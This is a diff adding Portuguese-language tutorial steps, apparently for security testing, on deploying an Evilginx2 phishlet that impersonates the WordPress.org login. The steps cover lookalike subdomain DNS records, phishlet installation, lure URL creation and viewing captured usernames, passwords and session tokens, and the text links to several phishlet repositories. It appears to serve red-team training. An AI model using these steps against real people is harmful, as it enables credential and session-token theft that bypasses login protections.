@@ -76,7 +76,12 @@ Os phishlets permitem que invasores (ou membros de equipes de teste de seguranç
 Acesse este link:
 
 > https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/wordpress.org.yaml
-> 
+
+**Outros**
+- https://www.patreon.com/posts/evilginx-3-2-2-97305954?l=es
+- https://github.com/yudasm/WHfB-o365-Phishlet/blob/main/o365whfb.yaml
+- https://github.com/hash3liZer/phishlets
+- https://github.com/simplerhacking/Evilginx3-Phishlets
 
 Clique em **“Raw”** e, em seguida, copie todo o conteúdo YAML.
 
@@ -110,5 +115,109 @@ Veja o que procurar no arquivo `wordpress.org.yaml`:
 > Este phishlet tem como alvo o domínio oficial wordpress.org. Ele não funcionará imediatamente em sites WordPress auto-hospedados, como hacksmarter-manufacturing.shop. É necessária personalização.
 >
 
+
+# **Configurando seu primeiro Phishlet**
+
+### **Parte 1: Atualizar registros DNS para subdomínios do Phishlet**
+
+O Phishlet do WordPress.org requer vários subdomínios para funcionar corretamente:
+
+- `login.seudominio.com`
+- `make.seudominio.com`
+- `profiles.seudominio.com`
+
+### **Passos (usando o Namecheap):**
+
+1. Faça login na sua conta do Namecheap.
+2. Vá para **Lista de domínios** → clique em **Gerenciar** no seu domínio.
+3. Navegue até a guia **DNS avançado**.
+4. Adicione três novos **Registros A**:
+- 
+    - **Tipo**: Registro A
+    - **Host**: `login`, `make` e `profiles` (um por registro)
+    - **Valor**: O IP público do seu VPS (por exemplo, `147.182.215.174`)
+    - **TTL**: 1 minuto
+1. Clique no **✓** verde para salvar cada um.
+2. Aguarde cerca de 5 minutos para a propagação do DNS.
+
+---
+
+### **Parte 2: Adicione o Phishlet ao Evilginx**
+
+- Conecte-se via SSH ao seu Droplet da Digital Ocean:
+
+ssh root@[seu_ip]
+
+- Navegue até o diretório `phishlets/`:
+
+cd ~/evilginx/phishlets
+
+- Abra um novo arquivo YAML e cole o conteúdo do phishlet do WordPress:
+
+nano wordpress.org.yaml
+
+- Cole o phishlet (copiado do GitHub ou de uma fonte local).
+- Salve e saia (`Ctrl + X`, depois `Y`, depois `Enter`).
+
+---
+### **Parte 3: Ativar o Phishlet no Evilginx**
+
+- Reinicie o Evilginx2 para carregar o novo phishlet:
+
+./evilginx
+
+- No shell do Evilginx2:
+
+phishlets # Confirme se ele aparece na lista phishlets hide example # Ocultar o exemplo padrão
+
+- Defina o nome do host (use seu domínio):
+
+phishlets hostname wordpress.org yourdomain.com
+
+- Ative o phishlet:
+
+phishlets enable wordpress.org
+
+> Certificados TLS serão solicitados automaticamente para todos os subdomínios necessários. Isso pode levar até 60 segundos.
+> 
+
+---
+
+### **Parte 4: Criar e testar a isca**
+
+- Crie uma isca:
+
+lures create wordpress.org
+
+- Obtenha a URL da isca:
+
+lures get-url 0
+
+1. Abra a URL no Firefox. Você deverá ver a página de login do WordPress.org, servida a partir do seu subdomínio malicioso (por exemplo, `login.yourdomain.com`).
+
+---
+
+### **Parte 5: Simule o login de uma vítima**
+
+Use credenciais fictícias:
+
+- Nome de usuário: `admin`
+- Senha: `password123`
+
+Envie o formulário de login.
+
+- No Evilginx, verifique os dados capturados:
+
+sessions
+
+Você deve ver agora:
+
+- Nome de usuário da vítima
+- Senha
+- Tokens de sessão (se o login for bem-sucedido)
+- IP de origem e carimbo de data/hora
+
+> ⚠️ Se bots estiverem acessando sua instância do Evilginx2, você poderá ver muitas solicitações com falha — o Evilginx coloca automaticamente na lista negra o tráfego que não seja de isca. Isso diminuirá após 5 a 10 minutos.
+>
 
 
